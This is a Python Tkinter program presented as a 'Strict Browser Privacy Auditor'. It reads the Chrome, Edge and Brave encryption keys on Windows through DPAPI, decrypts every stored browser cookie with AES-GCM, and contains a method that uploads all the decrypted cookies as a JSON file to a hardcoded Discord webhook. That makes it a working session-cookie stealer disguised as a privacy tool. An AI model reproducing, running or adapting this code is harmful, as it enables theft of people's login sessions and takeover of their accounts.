import os
import sys
import sqlite3
import shutil
import tempfile
import json
import requests
import threading
import tkinter as tk
from tkinter import ttk
from datetime import datetime
import io
import base64
import binascii

# Professional Cryptography
from Cryptodome.Cipher import AES

# Windows-specific imports
if sys.platform == 'win32':
    import win32crypt

class StrictlyFixedAuditor:
    def __init__(self, root):
        self.root = root
        self.root.title("Strict Browser Privacy Auditor")
        self.root.geometry("1400x1000")
        self.root.minsize(1200, 900)

        # Initialize attributes first
        self.encryption_keys = {}  # Store keys per browser
        self.grouped_data = {} 
        self.history_data = []
        self.webhook_url = "https://discord.com/api/webhooks/1471126979171454989/OjMIw08BbpRPjJoa_m_iXZU4jZjbQGhSFYGlJsfLeGcVg_1Ggjr5qCkWugF4TfGKlCwO"

        # --- STRICT UI FIX ---
        self.style = ttk.Style()
        self.style.theme_use('clam') 
        self.style.configure("Treeview", 
                             rowheight=30,  
                             font=("Arial", 10))
        
        # Setup UI first (so console exists)
        self.setup_ui()
        self.setup_output_console()
        
        # Detect browsers
        self.detect_browsers_windows()
        
        # Load encryption keys for all detected browsers
        self.load_browser_encryption_keys()

    def clean_cookie_value(self, value):
        """Properly clean and decode cookie values"""
        if not value:
            return ""
        
        # If it's bytes, try to decode it properly
        if isinstance(value, bytes):
            # First, try to decode as UTF-8 (most common for text cookies)
            try:
                decoded = value.decode('utf-8')
                # Check if it's readable text (mostly ASCII)
                if all(32 <= ord(c) <= 126 or c in '\n\r\t' for c in decoded):
                    return decoded
            except UnicodeDecodeError:
                pass
            
            # Try as UTF-16 (some Microsoft cookies use this)
            try:
                decoded = value.decode('utf-16-le')
                if all(32 <= ord(c) <= 126 or c in '\n\r\t' for c in decoded):
                    return decoded
            except UnicodeDecodeError:
                pass
            
            # Try as Latin-1 (never fails, but might produce garbage)
            try:
                decoded = value.decode('latin-1')
                # Check if it's mostly readable
                readable = sum(1 for c in decoded if 32 <= ord(c) <= 126)
                if readable > len(decoded) * 0.7:  # 70% readable
                    return decoded
            except:
                pass
            
            # Check if it's actually base64 encoded
            try:
                # Try to decode as base64
                if len(value) % 4 == 0:  # Base64 strings are multiples of 4
                    decoded_b64 = base64.b64decode(value)
                    # Try to decode the result as UTF-8
                    try:
                        result = decoded_b64.decode('utf-8')
                        if all(32 <= ord(c) <= 126 or c in '\n\r\t' for c in result):
                            return f"[BASE64] {result}"
                    except:
                        # If the base64 decoded result is binary, show as hex
                        return f"[BASE64] {binascii.hexlify(decoded_b64[:50]).decode('ascii')}..."
            except:
                pass
            
            # If all else fails, show as hex
            if len(value) > 0:
                hex_str = binascii.hexlify(value[:50]).decode('ascii')
                if len(value) > 50:
                    return f"[HEX] {hex_str}..."
                else:
                    return f"[HEX] {hex_str}"
            
            return ""
        
        # If it's already a string, clean it up
        elif isinstance(value, str):
            # Remove null bytes and control characters
            cleaned = []
            for c in value:
                if c == '\x00':
                    continue
                if ord(c) < 32 and c not in '\n\r\t':
                    continue
                cleaned.append(c)
            return ''.join(cleaned)
        
        return str(value)

    def load_browser_encryption_keys(self):
        """Load encryption keys for all detected browsers"""
        for browser_name in self.browsers.keys():
            key = self.load_encryption_key_for_browser(browser_name)
            if key:
                self.encryption_keys[browser_name] = key
                self.log_to_console(f"✓ Loaded encryption key for {browser_name}", "success")
            else:
                self.log_to_console(f"✗ Could not load encryption key for {browser_name}", "warning")

    def load_encryption_key_for_browser(self, browser_name):
        """Load encryption key for a specific browser"""
        try:
            local_state_paths = {
                "Chrome": os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State'),
                "Edge": os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Local State'),
                "Brave": os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State'),
                "Chrome Beta": os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome Beta', 'User Data', 'Local State'),
                "Chrome Canary": os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome SxS', 'User Data', 'Local State'),
            }
            
            if browser_name not in local_state_paths:
                return None
                
            local_state_path = local_state_paths[browser_name]
            
            if os.path.exists(local_state_path):
                self.log_to_console(f"Found {browser_name} Local State at: {local_state_path}", "info")
                
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                
                # Get encrypted key from Local State
                if 'os_crypt' in local_state and 'encrypted_key' in local_state['os_crypt']:
                    encrypted_key = local_state['os_crypt']['encrypted_key']
                    
                    # Decode from base64
                    encrypted_key = base64.b64decode(encrypted_key)
                    
                    # Remove 'DPAPI' prefix (first 5 bytes)
                    encrypted_key = encrypted_key[5:]
                    
                    # Decrypt using DPAPI
                    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                    
                    # Log key info
                    key_hex = decrypted_key.hex()[:16] + "..." if decrypted_key else "None"
                    self.log_to_console(f"  {browser_name} key (first 8 bytes): {key_hex}", "info")
                    self.log_to_console(f"  {browser_name} key length: {len(decrypted_key)} bytes", "info")
                    
                    return decrypted_key
            else:
                self.log_to_console(f"  {browser_name} Local State not found at: {local_state_path}", "info")
                
        except Exception as e:
            self.log_to_console(f"  Error loading {browser_name} key: {str(e)}", "error")
        
        return None

    def detect_browsers_windows(self):
        """Detect browsers on Windows with expanded paths"""
        local_app_data = os.environ.get('LOCALAPPDATA', '')
        
        self.browsers = {}
        
        # Detailed browser paths
        browser_paths = {
            "Chrome": [
                os.path.join(local_app_data, "Google", "Chrome", "User Data", "Default"),
                os.path.join(local_app_data, "Google", "Chrome", "User Data", "Profile 1"),
            ],
            "Edge": [
                os.path.join(local_app_data, "Microsoft", "Edge", "User Data", "Default"),
            ],
            "Brave": [
                os.path.join(local_app_data, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            ]
        }
        
        # Check each browser path
        for browser_name, paths in browser_paths.items():
            for path in paths:
                if os.path.exists(path):
                    # Verify this is actually a browser profile (check for Cookies file)
                    cookies_path = os.path.join(path, "Network", "Cookies")
                    if not os.path.exists(cookies_path):
                        cookies_path = os.path.join(path, "Cookies")
                    
                    if os.path.exists(cookies_path):
                        self.browsers[browser_name] = path
                        self.log_to_console(f"✓ Detected {browser_name} at: {path}", "success")
                        break
        
        if not self.browsers:
            self.log_to_console("⚠ No browsers detected!", "warning")

    def decrypt_chrome_cookie(self, encrypted_value, encryption_key):
        """Decrypt Chrome/Edge cookie using AES-256-GCM (supports v10, v11, v20)"""
        if not encrypted_value or not encryption_key:
            return ""
        
        try:
            # Handle different input types
            if isinstance(encrypted_value, str):
                encrypted_value = encrypted_value.encode('latin1')
            elif isinstance(encrypted_value, memoryview):
                encrypted_value = bytes(encrypted_value)
            elif isinstance(encrypted_value, bytes):
                pass  # Already bytes
            else:
                return ""
            
            # Check for supported versions (v10, v11, v20)
            if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11') or encrypted_value.startswith(b'v20'):
                # Remove version prefix (3 bytes)
                encrypted_value = encrypted_value[3:]
                
                # Need at least nonce (12) + tag (16) = 28 bytes
                if len(encrypted_value) < 28:
                    return ""
                
                # Extract nonce (first 12 bytes), ciphertext, and tag (last 16 bytes)
                nonce = encrypted_value[:12]
                ciphertext = encrypted_value[12:-16]
                tag = encrypted_value[-16:]
                
                # Create AES-GCM cipher
                cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=nonce)
                
                # Decrypt
                try:
                    decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                    return self.clean_cookie_value(decrypted)
                except Exception as e:
                    # Try without verification as fallback
                    try:
                        cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=nonce)
                        decrypted = cipher.decrypt(ciphertext)
                        return self.clean_cookie_value(decrypted)
                    except:
                        return ""
            else:
                # For non-v10/v11/v20 data, try DPAPI
                try:
                    decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                    return self.clean_cookie_value(decrypted)
                except Exception as e:
                    return ""
                    
        except Exception as e:
            return ""

    def decrypt_value(self, encrypted_value, browser_name):
        """Decrypt cookie using browser-specific encryption key"""
        if not encrypted_value:
            return ""
        
        # Get encryption key for this browser
        encryption_key = self.encryption_keys.get(browser_name)
        
        if encryption_key:
            return self.decrypt_chrome_cookie(encrypted_value, encryption_key)
        else:
            # Try DPAPI as fallback
            try:
                if isinstance(encrypted_value, str):
                    encrypted_value = encrypted_value.encode('latin1')
                decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                return self.clean_cookie_value(decrypted)
            except:
                return ""

    def setup_output_console(self):
        """Create an output console for real-time logging"""
        console_frame = tk.LabelFrame(self.root, text="3. Real-time Audit Console Output", padx=5, pady=5)
        console_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 10))
        
        self.console_text = tk.Text(console_frame, font=("Consolas", 9), bg="#1e1e1e", fg="#00ff00", 
                                    wrap=tk.WORD, height=10)
        console_scrollbar = ttk.Scrollbar(console_frame, orient=tk.VERTICAL, command=self.console_text.yview)
        self.console_text.configure(yscrollcommand=console_scrollbar.set)
        
        self.console_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        console_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Configure console tags
        self.console_text.tag_configure("error", foreground="#ff5555")
        self.console_text.tag_configure("success", foreground="#55ff55")
        self.console_text.tag_configure("info", foreground="#5555ff")
        self.console_text.tag_configure("warning", foreground="#ffff55")
        self.console_text.tag_configure("header", foreground="#ff55ff", font=("Consolas", 10, "bold"))
        
        # Initial console message
        self.log_to_console("=== Browser Privacy Auditor Initialized ===", "header")
        self.log_to_console(f"Platform: {sys.platform}", "info")
        self.log_to_console("Detecting browsers...", "info")

    def log_to_console(self, message, tag="info"):
        """Add a message to the console output with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        formatted_message = f"[{timestamp}] {message}\n"
        
        self.console_text.insert(tk.END, formatted_message, tag)
        self.console_text.see(tk.END)
        self.root.update_idletasks()

    def setup_ui(self):
        # Header
        header = tk.Frame(self.root, height=80, bg="#1a1a1a")
        header.pack(fill=tk.X, side=tk.TOP)
        header.pack_propagate(False) 

        tk.Label(header, text="REAL-TIME PRIVACY AUDITOR", font=("Arial", 16, "bold"), 
                bg="#1a1a1a", fg="#00ff00").pack(side=tk.LEFT, padx=25)
        
        # Stats label
        self.stats_label = tk.Label(header, text="", font=("Arial", 10), 
                                   bg="#1a1a1a", fg="#ffffff")
        self.stats_label.pack(side=tk.LEFT, padx=25)
        
        # Scan button
        self.scan_btn = tk.Button(header, text="RUN AUDIT & AUTO-SEND", 
                                 command=self.perform_scan, bg="#444", fg="white", 
                                 font=("Arial", 9, "bold"))
        self.scan_btn.pack(side=tk.RIGHT, padx=25)

        # Main container
        container = tk.Frame(self.root, padx=15, pady=10)
        container.pack(fill=tk.BOTH, expand=True)

        # Summary frame
        list_frame = tk.LabelFrame(container, text="1. Summary")
        list_frame.pack(fill=tk.BOTH, expand=True)

        cols = ("ID", "Source", "Type", "Details")
        self.tree = ttk.Treeview(list_frame, columns=cols, show="headings", height=12, style="Treeview")
        
        self.tree.heading("ID", text="ID"); self.tree.column("ID", width=60, stretch=False, anchor=tk.CENTER)
        self.tree.heading("Source", text="Source"); self.tree.column("Source", width=120, stretch=False)
        self.tree.heading("Type", text="Type"); self.tree.column("Type", width=150, stretch=False)
        self.tree.heading("Details", text="Site / Domain / URL Details"); self.tree.column("Details", width=800, stretch=True)

        y_scroll = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.tree.yview)
        x_scroll = ttk.Scrollbar(list_frame, orient=tk.HORIZONTAL, command=self.tree.xview)
        self.tree.configure(yscroll=y_scroll.set, xscroll=x_scroll.set)

        self.tree.grid(row=0, column=0, sticky='nsew')
        y_scroll.grid(row=0, column=1, sticky='ns')
        x_scroll.grid(row=1, column=0, sticky='ew')
        
        list_frame.grid_rowconfigure(0, weight=1)
        list_frame.grid_columnconfigure(0, weight=1)

        self.tree.bind("<<TreeviewSelect>>", self.on_row_select)

        # Inspector frame
        inspector_frame = tk.LabelFrame(container, text="2. Decrypted Record Details (JSON)")
        inspector_frame.pack(fill=tk.BOTH, expand=True, pady=(15, 0))

        self.json_view = tk.Text(inspector_frame, font=("Courier", 10), bg="#f8f9fa", wrap=tk.NONE, height=10)
        
        ins_y = ttk.Scrollbar(inspector_frame, orient=tk.VERTICAL, command=self.json_view.yview)
        ins_x = ttk.Scrollbar(inspector_frame, orient=tk.HORIZONTAL, command=self.json_view.xview)
        self.json_view.configure(yscroll=ins_y.set, xscroll=ins_x.set)

        self.json_view.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        ins_y.pack(side=tk.RIGHT, fill=tk.Y)
        ins_x.pack(side=tk.BOTTOM, fill=tk.X)

        # Status bar
        self.status = tk.Label(self.root, text="System Standby...", anchor=tk.W, relief=tk.SUNKEN)
        self.status.pack(fill=tk.X, side=tk.BOTTOM)

    def perform_scan(self):
        # Clear previous data
        self.tree.delete(*self.tree.get_children())
        self.grouped_data = {}
        self.history_data = []
        
        # Update UI
        self.status.config(text="Processing databases...")
        self.log_to_console("=== Starting Audit Scan ===", "header")
        
        if not self.browsers:
            self.log_to_console("⚠ No browsers detected to scan!", "error")
            self.status.config(text="No browsers detected")
            return
        
        self.root.update()

        total_cookies = 0
        successful_decryptions = 0
        failed_decryptions = 0
        
        for name, path in self.browsers.items():
            self.log_to_console(f"\nScanning {name} browser at: {path}", "info")
            
            # Check if we have encryption key for this browser
            if name in self.encryption_keys:
                self.log_to_console(f"  ✓ Using {name} encryption key", "success")
            else:
                self.log_to_console(f"  ⚠ No encryption key for {name}, trying DPAPI fallback", "warning")
            
            # Cookies path
            c_file = os.path.join(path, "Network", "Cookies")
            if not os.path.exists(c_file):
                c_file = os.path.join(path, "Cookies")
            
            if os.path.exists(c_file):
                try:
                    # Create temp copy
                    tmp = os.path.join(tempfile.gettempdir(), f"cookies_{name}_{datetime.now().timestamp()}.db")
                    shutil.copy2(c_file, tmp)
                    
                    # Connect to database
                    conn = sqlite3.connect(tmp)
                    conn.text_factory = bytes
                    
                    cursor = conn.cursor()
                    
                    # Get cookies
                    cursor.execute("SELECT host_key, name, path, encrypted_value, is_secure, expires_utc FROM cookies")
                    
                    cookie_count = 0
                    for row in cursor.fetchall():
                        try:
                            # Decode fields
                            host_key = row[0].decode('utf-8', errors='ignore') if isinstance(row[0], bytes) else str(row[0])
                            name_str = row[1].decode('utf-8', errors='ignore') if isinstance(row[1], bytes) else str(row[1])
                            path_str = row[2].decode('utf-8', errors='ignore') if isinstance(row[2], bytes) else str(row[2])
                            
                            # Get encrypted value
                            encrypted_value = row[3]
                            
                            # Decrypt
                            val = self.decrypt_value(encrypted_value, name)
                            
                            # Track success/failure
                            if val:
                                successful_decryptions += 1
                            else:
                                failed_decryptions += 1
                            
                            obj = {
                                "domain": host_key,
                                "name": name_str,
                                "path": path_str,
                                "value": val,
                                "secure": bool(row[4]),
                                "expires_utc": row[5],
                            }
                            
                            if host_key and host_key not in self.grouped_data: 
                                self.grouped_data[host_key] = []
                            if host_key:
                                self.grouped_data[host_key].append(obj)
                                cookie_count += 1
                            
                        except Exception as e:
                            continue
                    
                    total_cookies += cookie_count
                    self.log_to_console(f"  ✓ Found {cookie_count} cookies from {name}", "success")
                    conn.close()
                    os.remove(tmp)
                    
                except Exception as e:
                    self.log_to_console(f"  ✗ Error reading cookies from {name}: {str(e)}", "error")
                    if os.path.exists(tmp):
                        try:
                            os.remove(tmp)
                        except:
                            pass
            else:
                self.log_to_console(f"  ✗ No cookies database found at: {c_file}", "warning")

        # Populate tree view
        row_id = 0
        unique_domains = len(self.grouped_data)
        
        self.log_to_console(f"\nProcessing results:", "header")
        
        # Sort domains
        sorted_domains = sorted(self.grouped_data.keys())
        for domain in sorted_domains:
            cookies = self.grouped_data[domain]
            row_id += 1
            display_text = f"{domain} ({len(cookies)} cookies)"
            self.tree.insert("", tk.END, values=(row_id, "Browser", "Cookie Group", display_text))
            
            # Log sample of decrypted values
            for cookie in cookies[:2]:
                if cookie['value']:
                    value_preview = cookie['value'][:50] + "..." if len(cookie['value']) > 50 else cookie['value']
                    self.log_to_console(f"    ✓ {cookie['name']}={value_preview}", "success")
        
        # Update stats
        stats_text = f"Domains: {unique_domains} | Cookies: {total_cookies} | Decrypted: {successful_decryptions} | Failed: {failed_decryptions}"
        self.stats_label.config(text=stats_text)
        
        self.log_to_console(f"\n=== Scan Complete ===", "header")
        self.log_to_console(f"Total: {unique_domains} domains, {total_cookies} cookies", "success")
        self.log_to_console(f"Successfully decrypted: {successful_decryptions} cookies", "success")
        self.log_to_console(f"Failed decryptions: {failed_decryptions} cookies", "warning" if failed_decryptions > 0 else "info")
        
        if successful_decryptions > 0:
            self.status.config(text=f"Audit complete. Found {successful_decryptions} decrypted cookies.")
        else:
            self.status.config(text="No decrypted cookies found.")

    def on_row_select(self, event):
        sel = self.tree.selection()
        if not sel: return
        vals = self.tree.item(sel[0])['values']
        self.json_view.delete(1.0, tk.END)
        
        if vals[2] == "Cookie Group":
            domain = vals[3].split(' (')[0]
            json_data = self.grouped_data.get(domain, {})
            formatted_json = json.dumps(json_data, indent=4, ensure_ascii=False, default=str)
            self.json_view.insert(tk.END, formatted_json)

    def _auto_send(self):
        try:
            report = {
                "scan_time": datetime.now().isoformat(),
                "platform": sys.platform,
                "stats": self.stats_label.cget('text'),
                "cookies": self.grouped_data
            }
            
            report_json = json.dumps(report, indent=4, ensure_ascii=False, default=str)
            f = io.BytesIO(report_json.encode('utf-8'))
            
            file_size_kb = len(report_json) / 1024
            self.log_to_console(f"Preparing to send report ({file_size_kb:.2f} KB) to Discord...", "info")
            
            response = requests.post(
                self.webhook_url, 
                files={'file': ('privacy_audit.json', f, 'application/json')}, 
                data={"content": f"**Privacy Audit Results**\nPlatform: {sys.platform}\nTimestamp: {datetime.now()}\n{self.stats_label.cget('text')}"},
                timeout=30
            )
            
            if response.status_code == 200 or response.status_code == 204:
                self.log_to_console("✓ Data successfully sent to Discord webhook!", "success")
                self.status.config(text="Data successfully sent to Discord.")
            else:
                self.log_to_console(f"✗ Discord webhook returned status: {response.status_code}", "error")
                
        except Exception as e:
            self.log_to_console(f"✗ Error sending data to Discord: {str(e)}", "error")
            self.status.config(text=f"Error sending data: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = StrictlyFixedAuditor(root)
    root.mainloop()
